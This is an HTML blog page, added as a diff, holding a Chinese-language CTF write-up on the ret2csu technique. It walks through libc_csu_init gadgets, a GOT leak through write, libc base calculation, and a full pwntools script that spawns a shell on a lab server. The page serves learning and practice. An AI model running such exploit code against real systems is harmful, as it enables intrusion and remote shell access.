@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ret2csuinit_old | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看具体信息：
+在程序中也没有system和/bin/sh
+栈也不是可读可写可执行。
+那我们选择通过泄露函数地址，来查找libc版本：
+那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。
+这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
+首先我们看到这个函数的汇编代码：
+这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
+将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 &#43;rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
+.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.text:0000000000400606 mov edi, r15d	//第一个参数放入rdi.text:0000000000400609 call qword ptr [r12&#43;rbx*8]//因为rbx为0，所以只有r12.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_old/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ret2csuinit_old" />
+<meta property="og:description" content="首先查看具体信息：
+在程序中也没有system和/bin/sh
+栈也不是可读可写可执行。
+那我们选择通过泄露函数地址，来查找libc版本：
+那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。
+这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
+首先我们看到这个函数的汇编代码：
+这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
+将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 &#43;rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
+.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.text:0000000000400606 mov edi, r15d	//第一个参数放入rdi.text:0000000000400609 call qword ptr [r12&#43;rbx*8]//因为rbx为0，所以只有r12." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/ret2csuinit_old/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ret2csuinit_old"/>
+<meta name="twitter:description" content="首先查看具体信息：
+在程序中也没有system和/bin/sh
+栈也不是可读可写可执行。
+那我们选择通过泄露函数地址，来查找libc版本：
+那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。
+这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
+首先我们看到这个函数的汇编代码：
+这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
+将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 &#43;rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
+.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.text:0000000000400606 mov edi, r15d	//第一个参数放入rdi.text:0000000000400609 call qword ptr [r12&#43;rbx*8]//因为rbx为0，所以只有r12."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "ret2csuinit_old",
+      "item": "https://jellyfish-pro.github.io/ctf/ret2csuinit_old/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ret2csuinit_old",
+  "name": "ret2csuinit_old",
+  "description": "首先查看具体信息：\n在程序中也没有system和/bin/sh\n栈也不是可读可写可执行。\n那我们选择通过泄露函数地址，来查找libc版本：\n那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。\n这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。\n首先我们看到这个函数的汇编代码：\n这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。\n将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。\n.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//设定为0\r.text:000000000040061B pop rbp\t//设定为1\r.text:000000000040061C pop r12\t//放入需要调用的函数地址\r.text:000000000040061E pop r13\t//放入第三个参数\r.text:0000000000400620 pop r14\t//放入第二个参数\r.text:0000000000400622 pop r15\t//放入第三个参数\r.text:0000000000400624 retn\t//返回到0x400600\r.text:0000000000400600 mov rdx, r13\t//第三个参数放入rdx\r.text:0000000000400603 mov rsi, r14\t//第二个参数放入rsi\r.text:0000000000400606 mov edi, r15d\t//第一个参数放入rdi\r.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12\r.",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看具体信息：\n在程序中也没有system和/bin/sh\n栈也不是可读可写可执行。\n那我们选择通过泄露函数地址，来查找libc版本：\n那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。\n这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。\n首先我们看到这个函数的汇编代码：\n这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。\n将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。\n.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//设定为0\r.text:000000000040061B pop rbp\t//设定为1\r.text:000000000040061C pop r12\t//放入需要调用的函数地址\r.text:000000000040061E pop r13\t//放入第三个参数\r.text:0000000000400620 pop r14\t//放入第二个参数\r.text:0000000000400622 pop r15\t//放入第三个参数\r.text:0000000000400624 retn\t//返回到0x400600\r.text:0000000000400600 mov rdx, r13\t//第三个参数放入rdx\r.text:0000000000400603 mov rsi, r14\t//第二个参数放入rsi\r.text:0000000000400606 mov edi, r15d\t//第一个参数放入rdi\r.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12\r.text:000000000040060D add rbx, 1\t//rbx为0，加1为1\r.text:0000000000400611 cmp rbx, rbp\t//rbx与rbp相等。不会跳转\r.text:0000000000400614 jnz short loc_400600//继续执行下面到ret\r.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//填充8个无效字符\r.text:000000000040061B pop rbp\t//填充8个无效字符\r.text:000000000040061C pop r12\t//填充8个无效字符\r.text:000000000040061E pop r13\t//填充8个无效字符\r.text:0000000000400620 pop r14\t//填充8个无效字符\r.text:0000000000400622 pop r15\t//填充8个无效字符\r.text:0000000000400624 retn\t//返回到任意想要返回的地址 所以payload就为：\npayload = b'A'*136 payload += p64(pop_6_addr) //让主程序跳到0x40061A，开始布置参数传递\rpayload += p64(0) + p64(1) //rbx=0，rbp=1\rpayload += p64(write_got) //将需要调用的函数地址给r12\rpayload += p64(8)\t//将8给r13，表示让write函数输出8个字符，准备传给rdx\rpayload += p64(write_got) //将write的地址给r14，准备传给rsi\rpayload += p64(1) //将1给r15，准备传给rdi\rpayload += p64(mov_addr) //ret返回到0x400600\rpayload += b'a'*(0x8+8*6) //重新填充rbx rbp r13 r14 r15\rpayload += p64(main_addr)\t//返回主函数 将栈这样布置，就可以通过write函数泄露write的地址了：\n通过后12位地址，我们就可以找到对应的libc版本：\n然后通过这个libc查询到对应的system函数地址和/bin/sh的偏移量。\n接下来我们直接像libc3那道题一样添加填充，然后利用gadget将/bin/sh的地址放入rdi，然后调用system函数就好了：\npayload2 = b'A'*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr) #ret2csuinit\rfrom pwn import *\r#p = process('./ret2csuinit')\rp = remote('10.0.25.109',10008)\relf = ELF('./ret2csuinit')\rlibc = ELF('./libc.so.62')\r#context.log_level = 'debug'\rpop_6_addr = 0x40061a\rwrite_plt = elf.plt['write']\rwrite_got = elf.got['write']\rmov_addr = 0x400600\rmain_addr = elf.symbols['main']\rread_got = elf.got['read']\rbuf_addr = 0x601000\rpop_rdi_ret = 0x400623\rpayload = b'A'*136 + p64(pop_6_addr) + p64(0) + p64(1) + p64(write_got) + p64(8)\rpayload += p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) + p64(main_addr)\rp.recvuntil('Hello, World\\n')\rp.sendline(payload)\rwrite_leak = u64(p.recv(6).ljust(8,b'\\x00'))\rprint('write ',hex(write_leak))\rbase = write_leak - libc.symbols['write']\rsys_addr = base + libc.symbols['system']\rbin_addr = base + 0x18CE57\rprint('system ',hex(sys_addr))\r#gdb.attach(p)\rpayload2 = b'A'*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr)\rpause()\rp.recvuntil('Hello, World\\n')\rp.sendline(payload2)\rp.interactive() ",
+  "wordCount" : "284",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/ret2csuinit_old/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      ret2csuinit_old
+    </h1>
+    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看具体信息：</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401101114123.png" alt="image-20220401101114123"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401102126218.png" alt="image-20220401102126218"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401101251008.png" alt="image-20220401101251008"  />
+</p>
+<p>在程序中也没有system和/bin/sh</p>
+<p>栈也不是可读可写可执行。</p>
+<p>那我们选择通过泄露函数地址，来查找libc版本：</p>
+<p>那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401102758882.png" alt="image-20220401102758882"  />
+</p>
+<p>这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。</p>
+<p>首先我们看到这个函数的汇编代码：</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401105325675.png" alt="image-20220401105325675"  />
+</p>
+<p>这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。</p>
+<p>将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。</p>
+<pre tabindex="0"><code>.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx			//设定为0
+.text:000000000040061B                 pop     rbp			//设定为1
+.text:000000000040061C                 pop     r12			//放入需要调用的函数地址
+.text:000000000040061E                 pop     r13			//放入第三个参数
+.text:0000000000400620                 pop     r14			//放入第二个参数
+.text:0000000000400622                 pop     r15			//放入第三个参数
+.text:0000000000400624                 retn					//返回到0x400600
+
+
+.text:0000000000400600                 mov     rdx, r13		//第三个参数放入rdx
+.text:0000000000400603                 mov     rsi, r14		//第二个参数放入rsi
+.text:0000000000400606                 mov     edi, r15d	//第一个参数放入rdi
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12
+.text:000000000040060D                 add     rbx, 1		//rbx为0，加1为1
+.text:0000000000400611                 cmp     rbx, rbp		//rbx与rbp相等。不会跳转
+.text:0000000000400614                 jnz     short loc_400600//继续执行下面到ret
+
+
+.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx			//填充8个无效字符
+.text:000000000040061B                 pop     rbp			//填充8个无效字符
+.text:000000000040061C                 pop     r12			//填充8个无效字符
+.text:000000000040061E                 pop     r13			//填充8个无效字符
+.text:0000000000400620                 pop     r14			//填充8个无效字符
+.text:0000000000400622                 pop     r15			//填充8个无效字符
+.text:0000000000400624                 retn					//返回到任意想要返回的地址
+</code></pre><p>所以payload就为：</p>
+<pre tabindex="0"><code>payload = b&#39;A&#39;*136 
+payload += p64(pop_6_addr) 			//让主程序跳到0x40061A，开始布置参数传递
+payload += p64(0) + p64(1) 			//rbx=0，rbp=1
+payload += p64(write_got) 			//将需要调用的函数地址给r12
+payload += p64(8)					//将8给r13，表示让write函数输出8个字符，准备传给rdx
+payload += p64(write_got) 			//将write的地址给r14，准备传给rsi
+payload += p64(1) 					//将1给r15，准备传给rdi
+payload += p64(mov_addr) 			//ret返回到0x400600
+payload += b&#39;a&#39;*(0x8+8*6) 			//重新填充rbx rbp r13 r14 r15
+payload += p64(main_addr)			//返回主函数
+</code></pre><p>将栈这样布置，就可以通过write函数泄露write的地址了：</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401114452907.png" alt="image-20220401114452907"  />
+</p>
+<p>通过后12位地址，我们就可以找到对应的libc版本：</p>
+<p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401114838561.png" alt="image-20220401114838561"  />
+</p>
+<p>然后通过这个libc查询到对应的system函数地址和/bin/sh的偏移量。</p>
+<p>接下来我们直接像libc3那道题一样添加填充，然后利用gadget将/bin/sh的地址放入rdi，然后调用system函数就好了：</p>
+<pre tabindex="0"><code>payload2 = b&#39;A&#39;*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr)
+</code></pre><pre tabindex="0"><code>#ret2csuinit
+from pwn import *
+
+#p = process(&#39;./ret2csuinit&#39;)
+p = remote(&#39;10.0.25.109&#39;,10008)
+elf = ELF(&#39;./ret2csuinit&#39;)
+libc = ELF(&#39;./libc.so.62&#39;)
+#context.log_level = &#39;debug&#39;
+
+pop_6_addr = 0x40061a
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+mov_addr = 0x400600
+main_addr = elf.symbols[&#39;main&#39;]
+read_got = elf.got[&#39;read&#39;]
+buf_addr = 0x601000
+pop_rdi_ret = 0x400623
+
+payload = b&#39;A&#39;*136 + p64(pop_6_addr) + p64(0) + p64(1) + p64(write_got) + p64(8)
+payload += p64(write_got) + p64(1) + p64(mov_addr) + b&#39;a&#39;*(0x8+8*6) + p64(main_addr)
+
+p.recvuntil(&#39;Hello, World\n&#39;)
+p.sendline(payload)
+
+write_leak = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+
+print(&#39;write &#39;,hex(write_leak))
+base = write_leak - libc.symbols[&#39;write&#39;]
+sys_addr = base + libc.symbols[&#39;system&#39;]
+bin_addr = base + 0x18CE57
+print(&#39;system &#39;,hex(sys_addr))
+
+#gdb.attach(p)
+
+payload2 = b&#39;A&#39;*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr)
+pause()
+p.recvuntil(&#39;Hello, World\n&#39;)
+p.sendline(payload2)
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/ret2csuinit.img/image-20220401141830636.png" alt="image-20220401141830636"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_new/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2csuinit_new</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2libc1_new/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2libc1_new</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
